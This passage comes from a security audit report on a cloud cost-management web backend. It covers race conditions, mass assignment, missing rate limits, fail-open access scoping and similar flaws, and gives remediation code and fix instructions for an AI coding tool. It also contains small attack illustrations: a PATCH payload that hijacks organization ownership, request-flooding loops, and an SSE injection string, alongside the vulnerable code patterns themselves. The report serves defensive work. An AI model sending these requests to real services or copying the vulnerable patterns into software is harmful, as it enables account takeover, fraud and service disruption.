            cur.execute("UPDATE opportunities SET status = %s WHERE id = ANY(%s)", ...)
            conn.commit()
```

#### Claude Code Fix Instructions

```
In backend/services/opportunities_service.py:

1. Add SELECT ... FOR UPDATE in update_opportunity method (around line 508):

   BEFORE:
       # Direct UPDATE query without locking

   AFTER:
       # Lock row first
       cur.execute("SELECT * FROM opportunities WHERE id = %s FOR UPDATE", (str(opportunity_id),))
       opportunity = cur.fetchone()
       if not opportunity:
           raise ValueError("Opportunity not found")
       # Then proceed with UPDATE

2. In bulk_update_status (around line 598):

   Add at start of transaction:
       conn.execute("SET TRANSACTION ISOLATION LEVEL SERIALIZABLE")

   Before UPDATE, add:
       cur.execute("SELECT id FROM opportunities WHERE id = ANY(%s) FOR UPDATE", (opportunity_ids,))
```

---

### HIGH-NEW-5 — TOCTOU Vulnerability in Saved Views Access Control

**CVSS Estimate:** 7.5
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/saved_views_service.py:142-229`

**Vulnerability:**
```python
async def update_saved_view(self, context: RequestContext, view_id: UUID, ...):
    async with self.db.engine.begin() as conn:
        # Time-of-check (line 164)
        view = await self._get_view_with_access_check(conn, context, view_id)
        if not view:
            raise ValueError("View not found or access denied")

        # ... Time gap - view could be deleted/modified by another transaction ...

        # Time-of-use (line 213)
        await conn.execute(f"UPDATE saved_views SET {', '.join(updates)} WHERE id = :view_id ...")
```

**Issue:** Classic **Time-Of-Check-Time-Of-Use (TOCTOU)** race condition. Between the access check (line 164) and the actual update (line 213), another concurrent transaction could:
1. Delete the view
2. Change ownership to another user
3. Modify shared permissions
4. Update the view with conflicting changes

**Attack Scenario:**
```
Time T0: User A checks view ownership (belongs to User A) ✓
Time T1: User B transfers view ownership to themselves
Time T2: User A's update executes on view now owned by User B ✗
Result: Unauthorized modification
```

**Impact:**
- Unauthorized modifications to other users' views
- Data corruption from concurrent updates
- Privilege escalation
- Bypass of ownership validation

#### Remediation

```python
async def update_saved_view(self, context: RequestContext, view_id: UUID, ...):
    async with self.db.engine.begin() as conn:
        # Hold lock from check through update - atomic operation
        result = await conn.execute(
            """
            SELECT * FROM saved_views
            WHERE id = :view_id
            FOR UPDATE  -- Locks the row immediately
            """,
            {'view_id': view_id}
        )
        view = result.mappings().first()

        # Validate ownership while holding lock
        if not view:
            raise ValueError("View not found")
        if view['user_id'] != context.user_id:
            raise ValueError("Access denied")

        # Proceed with update - lock is still held
        await conn.execute(
            f"UPDATE saved_views SET {', '.join(updates)} WHERE id = :view_id",
            {...}
        )
        # Lock released on commit
```

**Alternative - Atomic update with validation in WHERE clause:**
```python
result = await conn.execute(
    f"""
    UPDATE saved_views
    SET {', '.join(updates)}
    WHERE id = :view_id AND user_id = :user_id
    RETURNING *
    """,
    {...}
)

if not result.mappings().first():
    raise ValueError("View not found or access denied")
```

#### Claude Code Fix Instructions

```
In backend/services/saved_views_service.py:

1. Replace update_saved_view method (lines 142-229):

   BEFORE:
       view = await self._get_view_with_access_check(conn, context, view_id)
       # ... gap ...
       await conn.execute("UPDATE saved_views ...")

   AFTER:
       # Atomic check-and-update with lock
       result = await conn.execute(
           "SELECT * FROM saved_views WHERE id = :view_id FOR UPDATE",
           {'view_id': view_id}
       )
       view = result.mappings().first()

       if not view or view['user_id'] != context.user_id:
           raise ValueError("View not found or access denied")

       # Update while holding lock
       await conn.execute("UPDATE saved_views ...")

2. Apply same pattern to delete_saved_view and set_active_view methods
```

---

### HIGH-NEW-6 — Mass Assignment Vulnerability in Opportunity Updates

**CVSS Estimate:** 7.5
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/opportunities_service.py:476-564`

**Vulnerability:**
```python
def update_opportunity(self, opportunity_id: UUID, data: Dict[str, Any], ...):
    # Build update query dynamically (lines 520-528)
    set_clauses = []
    values = []
    for col, val in data.items():  # NO ALLOWLIST - accepts any field!
        set_clauses.append(f"{col} = %s")
        if isinstance(val, (dict, list)):
            val = json.dumps(val)
        values.append(val)

    query = f"UPDATE opportunities SET {', '.join(set_clauses)} WHERE id = %s ..."
    cur.execute(query, values)
```

**Issue:** Accepts arbitrary fields from the `data` dictionary without any allowlist validation. An attacker can modify **protected fields** that should never be user-updateable:

**Exploitable Fields:**
- `organization_id` - Change ownership to another org (privilege escalation)
- `created_by_user_id` - Change creator (audit trail manipulation)
- `source` - Change from 'automated' to 'manual' (bypass automation controls)
- `source_id` - Bypass deduplication logic
- `created_at` - Manipulate audit timestamps
- `detected_at` - Falsify detection timestamps

**Proof of Concept:**
```python
# Attacker sends PATCH request:
PATCH /api/v1/opportunities/{id}
{
  "organization_id": "victim-org-uuid",  # Hijack opportunity to another org
  "created_by_user_id": "admin-uuid",    # Impersonate admin
  "estimated_monthly_savings": 999999999  # Inflate savings
}

# Current code accepts ALL fields and updates them!
```

**Impact:**
- Privilege escalation (change org ownership)
- Audit trail manipulation (change creator, timestamps)
- Data corruption (modify system-managed fields)
- Business logic bypass (change source/source_id)
- Financial fraud (manipulate savings amounts)

#### Remediation

```python
# Define allowed updateable fields
UPDATEABLE_FIELDS = {
    'title', 'description', 'category', 'status', 'status_reason',
    'estimated_monthly_savings', 'estimated_annual_savings',
    'implementation_effort', 'priority', 'metadata', 'notes'
}

ADMIN_ONLY_FIELDS = {
    'organization_id', 'created_by_user_id', 'source', 'source_id'
}

def update_opportunity(self, opportunity_id: UUID, data: Dict[str, Any], user_id: UUID, is_admin: bool = False):
    # Filter to allowed fields only
    allowed = UPDATEABLE_FIELDS | (ADMIN_ONLY_FIELDS if is_admin else set())
    filtered_data = {k: v for k, v in data.items() if k in allowed}

    if not filtered_data:
        raise ValueError("No valid fields to update")

    # Log attempt to modify protected fields
    rejected = set(data.keys()) - allowed
    if rejected:
        logger.warning("mass_assignment_attempt",
                      user_id=user_id,
                      rejected_fields=list(rejected))

    set_clauses = []
    values = []
    for col, val in filtered_data.items():
        set_clauses.append(f"{col} = %s")
        values.append(val)

    # Rest of update logic...
```

#### Claude Code Fix Instructions

```
In backend/services/opportunities_service.py:

1. Add field allowlist constants at class level (after imports):

   UPDATEABLE_FIELDS = {
       'title', 'description', 'category', 'status', 'status_reason',
       'estimated_monthly_savings', 'estimated_annual_savings',
       'implementation_effort', 'priority', 'metadata', 'notes',
       'aws_resource_id', 'aws_resource_type', 'aws_region'
   }

   PROTECTED_FIELDS = {
       'id', 'organization_id', 'created_by_user_id', 'source',
       'source_id', 'created_at', 'updated_at', 'detected_at'
   }

2. In update_opportunity method (around line 520), replace:

   BEFORE:
       for col, val in data.items():
           set_clauses.append(f"{col} = %s")

   AFTER:
       # Filter to allowed fields only
       filtered_data = {k: v for k, v in data.items() if k in UPDATEABLE_FIELDS}

       if not filtered_data:
           raise ValueError("No valid fields to update")

       # Log rejected fields
       rejected = set(data.keys()) - UPDATEABLE_FIELDS
       if rejected:
           logger.warning("mass_assignment_blocked", rejected_fields=list(rejected))

       for col, val in filtered_data.items():
           set_clauses.append(f"{col} = %s")

3. Update bulk_update_status to also use field validation
```

---

### HIGH-NEW-7 — Insufficient Rate Limiting on Critical Operations

**CVSS Estimate:** 7.5
**Status:** OPEN (new finding - discovered 2026-02-08)
**Files:** Multiple API endpoints

**Vulnerability:** Only the ingest endpoint has rate limiting applied. All other critical state-changing and resource-intensive operations lack rate limits, enabling:
- API abuse and DoS attacks
- Database overload from excessive bulk operations
- Cost escalation from unlimited AWS API calls
- Resource exhaustion

**Currently Rate-Limited:**
- ✅ `backend/api/opportunities.py:478` - `/ingest` endpoint only

**Missing Rate Limits:**
- ❌ Status updates (`PATCH /{id}/status`) - Line 330
- ❌ Bulk status updates (`POST /bulk-status`) - Line 383
- ❌ Opportunity deletion (`DELETE /{id}`) - Line 436
- ❌ Report creation (`POST /reports/scheduled`) - `phase3_enterprise.py`
- ❌ Account management (`POST /accounts`) - `phase3_enterprise.py:198`
- ❌ Permission updates (`POST /accounts/{id}/permissions`) - `phase3_enterprise.py`
- ❌ Cost aggregation (`GET /accounts/aggregate-costs`) - `phase3_enterprise.py:246`
- ❌ Saved view operations (create/update/delete) - `saved_views.py`

**Attack Scenarios:**

1. **Bulk Operation DoS:**
```python
# Attacker repeatedly calls bulk update with 1000 IDs
for i in range(10000):
    POST /api/v1/opportunities/bulk-status
    {
      "opportunity_ids": [all 1000 opportunity IDs],
      "status": "dismissed"
    }
# Result: Database overload, service degradation
```

2. **Cost Aggregation Abuse:**
```python
# Repeatedly trigger expensive Athena queries
for i in range(100):
    GET /api/v1/phase3/accounts/aggregate-costs?
        account_ids=all_100_accounts&
        start_date=2020-01-01&
        end_date=2026-12-31
# Result: Massive AWS costs, API throttling
```

3. **Report Creation Spam:**
```python
# Create thousands of scheduled reports
for i in range(10000):
    POST /api/v1/phase3/reports/scheduled
    {
      "name": f"Report {i}",
      "cron_expression": "* * * * *",  # Every minute
      "report_type": "cost_analysis"
    }
# Result: Compute resource exhaustion, cost escalation
```

**Impact:**
- Service degradation and downtime
- Database overload and query timeouts
- Excessive AWS costs from API abuse
- Resource exhaustion
- Legitimate users unable to access service

#### Remediation

Apply rate limiting to all critical endpoints with appropriate limits:

```python
# In backend/middleware/rate_limiting.py - enhance existing implementation

RATE_LIMIT_TIERS = {
    "high_frequency": {"max_requests": 100, "window_seconds": 60},      # 100/min
    "medium_frequency": {"max_requests": 100, "window_seconds": 3600},  # 100/hour
    "low_frequency": {"max_requests": 10, "window_seconds": 3600},      # 10/hour
    "bulk_operations": {"max_requests": 5, "window_seconds": 3600},     # 5/hour
    "expensive_queries": {"max_requests": 10, "window_seconds": 3600},  # 10/hour
}

# Apply to endpoints:

@router.patch("/{opportunity_id}/status")
@rate_limit(tier="medium_frequency")
async def update_opportunity_status(...):
    ...

@router.post("/bulk-status")
@rate_limit(tier="bulk_operations")  # Stricter limit
async def bulk_update_status(...):
    ...

@router.delete("/{opportunity_id}")
@rate_limit(tier="medium_frequency")
async def delete_opportunity(...):
    ...

@router.post("/reports/scheduled")
@rate_limit(tier="low_frequency")
async def create_scheduled_report(...):
    ...

@router.get("/accounts/aggregate-costs")
@rate_limit(tier="expensive_queries")
async def aggregate_multi_account_costs(...):
    ...
```

**Additional Protections:**
```python
# Add per-organization quotas
MAX_SCHEDULED_REPORTS_PER_ORG = 50
MAX_OPPORTUNITIES_PER_ORG = 10000
MAX_BULK_UPDATE_IDS = 100  # Limit IDs per bulk request

# Validate in endpoints:
if len(opportunity_ids) > MAX_BULK_UPDATE_IDS:
    raise HTTPException(400, f"Maximum {MAX_BULK_UPDATE_IDS} IDs per bulk request")
```

#### Claude Code Fix Instructions

```
1. In backend/middleware/rate_limiting.py:

   Add rate limit tier decorator variants:

   from functools import wraps

   def rate_limit_tier(tier: str):
       """Apply rate limiting based on predefined tier"""
       limits = RATE_LIMIT_TIERS[tier]
       return rate_limit(
           max_requests=limits["max_requests"],
           window_seconds=limits["window_seconds"]
       )

2. Apply to all critical endpoints:

   In backend/api/opportunities.py:

   @router.patch("/{opportunity_id}/status")
   @rate_limit_tier("medium_frequency")
   async def update_opportunity_status(...):

   @router.post("/bulk-status")
   @rate_limit_tier("bulk_operations")
   async def bulk_update_status(...):

   @router.delete("/{opportunity_id}")
   @rate_limit_tier("medium_frequency")
   async def delete_opportunity(...):

3. In backend/api/phase3_enterprise.py:

   @router.post("/reports/scheduled")
   @rate_limit_tier("low_frequency")
   async def create_scheduled_report(...):

   @router.get("/accounts/aggregate-costs")
   @rate_limit_tier("expensive_queries")
   async def aggregate_multi_account_costs(...):

4. In backend/api/saved_views.py:

   @router.post("")
   @rate_limit_tier("medium_frequency")
   async def create_saved_view(...):

   @router.delete("/{view_id}")
   @rate_limit_tier("medium_frequency")
   async def delete_saved_view(...):

5. Add validation in bulk operations:

   MAX_BULK_UPDATE_IDS = 100

   if len(opportunity_ids) > MAX_BULK_UPDATE_IDS:
       raise HTTPException(
           status_code=400,
           detail=f"Maximum {MAX_BULK_UPDATE_IDS} IDs allowed per bulk request"
       )
```

---

## 3 — MEDIUM SEVERITY

### MED-1 — Account Scoping Fails Open

**File:** `backend/middleware/account_scoping.py:111-122`

When the database query that loads a user's account permissions throws any exception, the middleware catches it and attaches an **empty context** — which has **zero account restrictions**:

```python
except Exception as e:
    logger.error("failed_to_load_request_context", ...)
    request.state.context = create_empty_context(user_email or 'anonymous')
    # ← request continues with NO account filtering
```

An attacker who can trigger this exception (e.g., via a database connection blip) can bypass multi-tenant isolation for the duration of the outage.

#### Remediation

Fail closed — return an HTTP 503 instead of continuing:

```python
except Exception as e:
    logger.error("failed_to_load_request_context", error=str(e), exc_info=True)
    from starlette.responses import JSONResponse
    return JSONResponse(
        status_code=503,
        content={"detail": "Unable to verify account permissions. Please try again."}
    )
```

#### Claude Code Fix Instructions

```
In backend/middleware/account_scoping.py, replace lines 111-122:

BEFORE:
    except Exception as e:
        logger.error(...)
        request.state.context = create_empty_context(user_email or 'anonymous')
        request.state.request_id = request_id
    return await call_next(request)

AFTER:
    except Exception as e:
        logger.error(
            "failed_to_load_request_context",
            error=str(e),
            request_id=str(request_id),
            exc_info=True,
        )
        from starlette.responses import JSONResponse
        return JSONResponse(
            status_code=503,
            content={"detail": "Unable to verify account permissions. Please try again later."}
        )
```

---

### MED-2 — Unauthenticated Prometheus Metrics Endpoint

**File:** `backend/main.py` — `/metrics` route

```python
@app.get("/metrics")
async def metrics():
    return generate_latest().decode('utf-8')
```

No authentication. Prometheus metrics expose endpoint paths, HTTP methods, status codes, and request latency — all useful for mapping the internal API surface before an attack.

#### Remediation

Gate `/metrics` behind a check for an internal network source IP or an admin token:

```python
@app.get("/metrics")
async def metrics(request: Request):
    # Option A: restrict to ECS internal network
    if request.client and request.client.host not in ALLOWED_SCRAPER_IPS:
        raise HTTPException(status_code=403, detail="Forbidden")
    return generate_latest().decode('utf-8')
```

#### Claude Code Fix Instructions

```
In backend/main.py, add a source-IP guard to the /metrics endpoint:

BEFORE:
    @app.get("/metrics")
    async def metrics():
        return generate_latest().decode('utf-8')

AFTER:
    from starlette.requests import Request as StarletteRequest

    @app.get("/metrics")
    async def metrics(request: StarletteRequest):
        # Allow only localhost and ECS internal network
        allowed = {"127.0.0.1", "::1"}  # extend with ECS task CIDR if known
        client_ip = request.client.host if request.client else None
        if client_ip not in allowed:
            raise HTTPException(status_code=403, detail="Forbidden")
        return generate_latest().decode('utf-8')
```

---

### MED-3 — LLM Raw Response Logged at Debug Level

**File:** `backend/services/text_to_sql_service.py:659`

```python
logger.debug("LLM raw response", response_length=len(raw_response), response_preview=raw_response[:200])
```

LLM responses include the full SQL query (with table names, filters, and potentially account-scoping data). If log level is set to DEBUG in any environment, this data is written to log aggregators.

#### Remediation

Remove the `response_preview` field or replace it with a hash:

```python
logger.debug("LLM raw response", response_length=len(raw_response))
```

#### Claude Code Fix Instructions

```
In backend/services/text_to_sql_service.py line 659:

BEFORE: logger.debug("LLM raw response", response_length=len(raw_response), response_preview=raw_response[:200])
AFTER:  logger.debug("LLM raw response", response_length=len(raw_response))
```

---

### MED-4 — Weak Password Policy

**File:** `backend/api/auth.py`, line ~40

```python
password: str = Field(..., min_length=1)  # accepts any single character
```

#### Remediation

```python
import re

password: str = Field(..., min_length=12)

@field_validator('password')
@classmethod
def validate_password_strength(cls, v):
    if not re.match(r'^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&]).{12,}$', v):
        raise ValueError(
            'Password must be ≥12 characters and include uppercase, lowercase, a digit, and a special character.'
        )
    return v
```

---

### MED-5 — SSE Stream Data Injection

**File:** `backend/api/chat.py`, lines ~297, 300, 309, 311, 317

Server-Sent Events are constructed via f-strings with unsanitized variables:

```python
yield f"data: {{'type': 'start', 'conversation_id': '{conversation_id}'}}\n\n"
```

A crafted `conversation_id` containing `\n\ndata:` can inject arbitrary SSE messages into the stream.

#### Remediation

Use `json.dumps()` for all SSE payloads:

```python
import json
yield f"data: {json.dumps({'type': 'start', 'conversation_id': conversation_id})}\n\n"
```

#### Claude Code Fix Instructions

```
In backend/api/chat.py:

1. Add: import json   (if not already imported)

2. Replace every f-string SSE yield with json.dumps():
   BEFORE: yield f"data: {{'type': 'start', 'conversation_id': '{conversation_id}'}}\n\n"
   AFTER:  yield f"data: {json.dumps({'type': 'start', 'conversation_id': conversation_id})}\n\n"

   Apply to all yield statements in the streaming generator (lines ~297-317).
```

---

### MED-6 — Missing Rate Limit on Token Validation Endpoint

**File:** `backend/api/auth.py`, `/api/auth/validate` endpoint

The token-validation endpoint has no rate limiting, allowing an attacker to probe thousands of tokens per minute to determine validity.

#### Remediation

Apply the existing rate-limiting middleware configuration to this endpoint explicitly, or add it to the high-rate-limit tier alongside login.

---

### MED-7 — Default SSL Mode is "prefer" (Unverified)

**File:** `backend/config/settings.py`, line ~135

The default `POSTGRES_SSL_MODE=prefer` negotiates encryption but does not verify the server certificate, leaving connections vulnerable to man-in-the-middle attacks in transit.

#### Remediation

Change the default to `verify-full` for production deployments. If the self-signed CA is used in staging, provide its path via `POSTGRES_SSL_CA_CERT`.

---

### MED-8 — Production Sourcemaps Exposed

**File:** `frontend/vite.config.ts`

```typescript
build: {
    sourcemap: true,   // unconditional — applies to production builds
}
```

Sourcemaps expose the original TypeScript source, component structure, and API call patterns to anyone inspecting the JavaScript bundle.

#### Remediation

```typescript
build: {
    sourcemap: process.env.NODE_ENV !== 'production',
}
```

Or set `sourcemap: 'hidden'` to generate sourcemaps for error tracking without shipping them to the client.

#### Claude Code Fix Instructions

```
In frontend/vite.config.ts, replace:
    sourcemap: true

With:
    sourcemap: process.env.NODE_ENV !== 'production',
```

---

### MED-9 — xlsx Package Fetched from External CDN

**File:** `frontend/package.json`

```json
"xlsx": "https://cdn.sheetjs.com/xlsx-0.20.3/xlsx-0.20.3.tgz"
```

This bypasses npm's integrity verification. If the CDN is compromised or the URL is re-pointed, a malicious package is installed without detection.

#### Remediation

Pin to the npm registry and lock with a checksum:

```json
"xlsx": "0.20.3"
```

Then run `npm install` and commit the updated `package-lock.json` (which records the registry hash).

---

### MED-10 — Internal Error Details Leaked in Chat Response

**File:** `backend/agents/multi_agent_workflow.py`, lines in the `except` block of `execute_multi_agent_query()`

```python
"message": f"I encountered an error: {str(e)}. Please try rephrasing your question."
```

Python exception `str(e)` is returned to the end user in the chat response. This can leak file paths, database connection strings, or AWS ARNs.

#### Remediation

```python
logger.error("query_execution_failed", error=str(e), exc_info=True)
return {
    ...
    "message": "I encountered an error while processing your request. Please try rephrasing your question.",
    ...
}
```

#### Claude Code Fix Instructions

```
In backend/agents/multi_agent_workflow.py, find the except block near the end
of execute_multi_agent_query() that returns:
    "message": f"I encountered an error: {str(e)}..."

Replace with:
    logger.error("query_execution_failed", error=str(e), exc_info=True)
    ...
    "message": "I encountered an error while processing your request. Please try rephrasing your question.",

Remove str(e) from both "message" and "final_response" fields.
Also remove str(e) from the "metadata.error" field — replace with a generic token or omit entirely.
```

---

### MED-11 — Unvalidated Cron Expression

**Status:** OPEN (carried from 2026-01-31 audit - NOT FIXED)
**File:** `backend/services/scheduled_report_service.py:380`

```python
cron = croniter(cron_expression, datetime.utcnow())
```

**Issue:** User-supplied `cron_expression` has no validation. While `croniter` raises `ValueError` on syntax errors, expressions like `* * * * *` (every minute) can cause resource exhaustion if many reports are created.

#### Remediation

Add a minimum interval check after parsing:

```python
cron = croniter(cron_expression, datetime.utcnow())
next_run = cron.get_next(datetime)
if (next_run - datetime.utcnow()).total_seconds() < 3600:
    raise ValueError("Cron expression must have a minimum interval of 1 hour")
```

---

### MED-12 — Token Blacklist Fails Open When Valkey Is Unavailable — FIXED

**Status:** FIXED — see F-9 in Section 1.

All four fail-open return paths in `is_access_token_blacklisted()` and `is_refresh_token_blacklisted()` now return `True` (fail-closed): both the `_client is None` guard and the `except Exception` handler in each function. Log events upgraded from `warning` to `error` to surface cache outages in monitoring. Two existing tests corrected to assert fail-closed behavior; two new tests added covering the exception-handler paths. `test_valid_token_authenticates` in `test_authentication.py` was missing a cache service mock (it previously passed only because fail-open masked the gap) — mock added consistent with the pattern used by adjacent tests in the same class.

---

### MED-NEW-13 — Stack Traces Exposed in Development Mode

**CVSS Estimate:** 6.5
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/main.py:244-251`

**Vulnerability:**
```python
if settings.environment == "production":
    return JSONResponse(status_code=500, content={"detail": "Internal server error"})
else:
    return JSONResponse(
        status_code=500,
        content={
            "detail": f"Internal server error: {str(exc)}",  # EXPOSES EXCEPTION
            "type": exc.__class__.__name__
        }
    )
```

**Issue:** In development/staging environments, raw exception messages are returned to users. These could contain:
- Database connection strings with credentials
- File paths revealing server structure
- AWS credentials or API errors
- PII from database queries
- Internal service topology

**Impact:**
- Information disclosure in non-production environments
- Attack reconnaissance (learning about internal structure)
- Potential credential exposure
- PII leakage

#### Remediation

```python
from backend.utils.pii_masking import sanitize_exception

if settings.environment == "production":
    detail = "Internal server error"
else:
    # Sanitize even in development
    detail = f"Internal server error: {sanitize_exception(str(exc))}"

return JSONResponse(
    status_code=500,
    content={
        "detail": detail,
        "type": exc.__class__.__name__
    }
)
```

#### Claude Code Fix Instructions

```
In backend/main.py lines 244-251:

1. Add import at top:
   from backend.utils.pii_masking import sanitize_exception

2. Replace the exception handler:

   BEFORE:
       else:
           return JSONResponse(
               status_code=500,
               content={
                   "detail": f"Internal server error: {str(exc)}",
                   "type": exc.__class__.__name__
               }
           )

   AFTER:
       else:
           return JSONResponse(
               status_code=500,
               content={
                   "detail": f"Internal server error: {sanitize_exception(str(exc))}",
                   "type": exc.__class__.__name__
               }
           )
```

---

### MED-NEW-14 — Race Condition in Organization Member Management

**CVSS Estimate:** 6.8
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/organization_service.py:286-367`

**Vulnerability:**
```python
async def add_member(self, context: RequestContext, user_email: str, role: str = 'member'):
    # Check member limit (line 336)
    org = await self.get_organization(context.organization_id)
    if org and org['member_count'] >= org['max_users']:
        raise ValueError("Organization has reached maximum member limit")

    # ... race window ...

    # Add member (line 341-352)
    await conn.execute("INSERT INTO organization_members ...")
```

**Issue:** Classic **check-then-act race condition**. Multiple concurrent requests could bypass the member limit:

**Attack Scenario:**
```
1. Thread A: Checks limit (49/50 members) → PASS
2. Thread B: Checks limit (49/50 members) → PASS
3. Thread A: Inserts member (now 50/50) → SUCCESS
4. Thread B: Inserts member (now 51/50) → LIMIT BYPASSED!
```

**Impact:**
- Bypass subscription limits
- Resource exhaustion (more users than plan allows)
- Billing fraud (exceed paid tier limits)
- DoS through membership spam

#### Remediation

**Option 1 - Database Constraint (Recommended):**
```sql
-- Add check constraint at database level
ALTER TABLE organizations
ADD CONSTRAINT check_member_limit
CHECK (member_count <= max_users);

-- Use atomic increment with validation
UPDATE organizations
SET member_count = member_count + 1
WHERE organization_id = :org_id
  AND member_count < max_users
RETURNING member_count;

-- If no rows returned, limit was reached
```

**Option 2 - Row-Level Locking:**
```python
async def add_member(self, context: RequestContext, user_email: str, role: str = 'member'):
    async with self.db.engine.begin() as conn:
        # Lock organization row FIRST
        result = await conn.execute(
            "SELECT * FROM organizations WHERE id = :org_id FOR UPDATE",
            {'org_id': context.organization_id}
        )
        org = result.mappings().first()

        # Check limit while holding lock
        if org['member_count'] >= org['max_users']:
            raise ValueError("Organization has reached maximum member limit")

        # Add member (lock is still held)
        await conn.execute("INSERT INTO organization_members ...")

        # Update count (lock is still held)
        await conn.execute(
            "UPDATE organizations SET member_count = member_count + 1 WHERE id = :org_id",
            {'org_id': context.organization_id}
        )
        # Lock released on commit
```

#### Claude Code Fix Instructions

```
In backend/services/organization_service.py:

Option 1 (Database Constraint - Recommended):

1. Create migration file: backend/alembic/versions/013_add_member_limit_constraint.py

   def upgrade():
       op.execute("""
           ALTER TABLE organizations
           ADD CONSTRAINT check_member_limit
           CHECK (member_count <= max_users)
       """)

   def downgrade():
       op.execute("ALTER TABLE organizations DROP CONSTRAINT check_member_limit")

2. In add_member method (line 286), replace check with atomic update:

   BEFORE:
       org = await self.get_organization(context.organization_id)
       if org and org['member_count'] >= org['max_users']:
           raise ValueError("Organization has reached maximum member limit")

   AFTER:
       # Atomic increment with constraint check
       result = await conn.execute("""
           UPDATE organizations
           SET member_count = member_count + 1
           WHERE id = :org_id
           RETURNING member_count, max_users
       """, {'org_id': context.organization_id})

       org = result.mappings().first()
       # Database constraint will raise error if limit exceeded

Option 2 (Row-Level Locking):

1. Wrap entire method in FOR UPDATE lock:

   async def add_member(self, context: RequestContext, user_email: str, role: str = 'member'):
       async with self.db.engine.begin() as conn:
           # Lock organization row
           result = await conn.execute(
               "SELECT * FROM organizations WHERE id = :org_id FOR UPDATE",
               {'org_id': context.organization_id}
           )
           org = result.mappings().first()

           # Check and add member atomically...
```

---

### MED-NEW-15 — TOCTOU in Organization Member Removal

**CVSS Estimate:** 6.5
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/organization_service.py:369-436`

**Vulnerability:**
```python
async def remove_member(self, context: RequestContext, user_id: UUID):
    async with self.db.engine.begin() as conn:
        # Line 389-395: Check owner count
        owner_count = await conn.execute(
            "SELECT COUNT(*) FROM organization_members WHERE organization_id = :org_id AND role = 'owner'",
            ...
        )

        # Line 398-405: Check target user role
        target_role = await conn.execute(
            "SELECT role FROM organization_members WHERE organization_id = :org_id AND user_id = :user_id",
            ...
        )

        # Line 407-408: Validate
        if target_row['role'] == 'owner' and owner_row['cnt'] <= 1:
            raise ValueError("Cannot remove the last owner")

        # Line 411-417: Delete (another owner could have been removed in meantime)
        await conn.execute("DELETE FROM organization_members ...")
```

**Issue:** Two separate queries without a shared lock create a **TOCTOU race window**:

**Attack Scenario:**
```
Org has 2 owners: Alice and Bob

Time T0: Alice initiates remove_member(Bob)
Time T1: Alice's transaction: Check owner count → 2 owners ✓
Time T2: Charlie (admin) removes Alice as owner → 1 owner left (Bob)
Time T3: Alice's transaction: Delete Bob → 0 owners! ✗
Result: Organization has NO owners (locked out)
```

**Impact:**
- Organizational lockout (no owners left)
- Broken business rule (every org must have ≥1 owner)
- Service disruption
- Requires manual database intervention to recover

#### Remediation

**Option 1 - Atomic Check-and-Delete:**
```python
async def remove_member(self, context: RequestContext, user_id: UUID):
    async with self.db.engine.begin() as conn:
        # Lock organization first
        await conn.execute(
            "SELECT * FROM organizations WHERE id = :org_id FOR UPDATE",
            {'org_id': context.organization_id}
        )

        # Atomic delete with validation in WHERE clause
        result = await conn.execute("""
            DELETE FROM organization_members
            WHERE organization_id = :org_id
              AND user_id = :user_id
              AND NOT (
                  role = 'owner' AND
                  (SELECT COUNT(*)
                   FROM organization_members
                   WHERE organization_id = :org_id AND role = 'owner') <= 1
              )
            RETURNING *
        """, {'org_id': context.organization_id, 'user_id': user_id})

        if not result.mappings().first():
            raise ValueError("Cannot remove member (last owner or not found)")
```

**Option 2 - Database Trigger:**
```sql
CREATE OR REPLACE FUNCTION check_last_owner()
RETURNS TRIGGER AS $$
BEGIN
    IF OLD.role = 'owner' THEN
        IF (SELECT COUNT(*) FROM organization_members
            WHERE organization_id = OLD.organization_id
              AND role = 'owner') <= 1 THEN
            RAISE EXCEPTION 'Cannot remove the last owner';
        END IF;
    END IF;
    RETURN OLD;
END;
$$ LANGUAGE plpgsql;

CREATE TRIGGER prevent_last_owner_removal
BEFORE DELETE ON organization_members
FOR EACH ROW
EXECUTE FUNCTION check_last_owner();
```

#### Claude Code Fix Instructions

```
In backend/services/organization_service.py:

Option 1 (Atomic Query - Recommended):

Replace remove_member method (lines 369-436):

BEFORE:
    # Separate queries for count check and deletion

AFTER:
    async def remove_member(self, context: RequestContext, user_id: UUID):
        async with self.db.engine.begin() as conn:
            # Lock organization
            await conn.execute(
                "SELECT * FROM organizations WHERE id = :org_id FOR UPDATE",
                {'org_id': context.organization_id}
            )

            # Atomic delete with embedded validation
            result = await conn.execute("""
                DELETE FROM organization_members
                WHERE organization_id = :org_id
                  AND user_id = :user_id
                  AND NOT (
                      role = 'owner' AND
                      (SELECT COUNT(*)
                       FROM organization_members
                       WHERE organization_id = :org_id AND role = 'owner') <= 1
                  )
                RETURNING *
            """, {'org_id': context.organization_id, 'user_id': user_id})

            deleted = result.mappings().first()
            if not deleted:
                raise ValueError("Cannot remove member (last owner or member not found)")

            # Update member count
            await conn.execute("""
                UPDATE organizations
                SET member_count = member_count - 1
                WHERE id = :org_id
            """, {'org_id': context.organization_id})

Option 2 (Database Trigger):

1. Create migration: backend/alembic/versions/014_add_last_owner_protection.py

   def upgrade():
       op.execute("""
           CREATE OR REPLACE FUNCTION check_last_owner()
           RETURNS TRIGGER AS $$
           BEGIN
               IF OLD.role = 'owner' THEN
                   IF (SELECT COUNT(*) FROM organization_members
                       WHERE organization_id = OLD.organization_id
                         AND role = 'owner') <= 1 THEN
                       RAISE EXCEPTION 'Cannot remove the last owner';
                   END IF;
               END IF;
               RETURN OLD;
           END;
           $$ LANGUAGE plpgsql;

           CREATE TRIGGER prevent_last_owner_removal
           BEFORE DELETE ON organization_members
           FOR EACH ROW
           EXECUTE FUNCTION check_last_owner();
       """)

2. Simplify application code - trigger handles validation
```

---

### MED-NEW-16 — No Validation of Account IDs in Cost Aggregation

**CVSS Estimate:** 6.2
**Status:** OPEN (new finding - discovered 2026-02-08)
**File:** `backend/services/multi_account_service.py:166-205`

**Vulnerability:**
```python
async def aggregate_costs_across_accounts(
    self,
    account_ids: Optional[List[str]],
    start_date: str,
    end_date: str,
    group_by: str = 'account'
):
    if not account_ids:
        # Fetches ALL active accounts - no limit!
        query = "SELECT account_id FROM aws_accounts WHERE status = 'ACTIVE'"
        accounts = await self.db.fetch_all(query)
        account_ids = [acc['account_id'] for acc in accounts]  # Could be 1000s

    # No validation of:
    # - date range (could query years of data)
